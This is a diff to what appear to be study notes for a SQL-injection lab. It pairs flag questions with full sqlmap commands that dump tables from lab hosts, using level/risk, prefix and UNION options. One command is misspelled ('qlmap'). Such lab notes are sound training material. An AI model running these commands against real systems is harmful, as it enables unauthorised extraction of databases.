@@ -158,4 +158,10 @@ What's the contents of table flag3? (Case #3) = Detect and exploit SQLi vulnerab
 sqlmap -u http://167.71.128.18:30210/case3.php? --cookie='id=1*' --batch --dump
 + 1  What's the contents of table flag4? (Case #4) = Detect and exploit SQLi vulnerability in JSON data {"id": 1}
 sqlmap -u http://167.71.128.18:30210/case4.php? --batch --data {'"id": 1'} --dump
+ What's the contents of table flag5? (Case #5) = Detect and exploit (OR) SQLi vulnerability in GET parameter id
+sqlmap -u http://167.71.138.188:30700/case5.php?id=1 --level=5 --risk=3 --batch --dump
+What's the contents of table flag6? (Case #6) = Detect and exploit SQLi vulnerability in GET parameter col having non-standard boundaries
+sqlmap -u http://167.71.138.188:30700/case6.php?col=id --prefix='`)' --batch --dump
+What's the contents of table flag7? (Case #7) = Detect and exploit SQLi vulnerability in GET parameter id by usage of UNION query-based technique
+qlmap -u http://167.71.138.188:30700/case7.php?id=1 --union-cols=5 --batch --dump
 
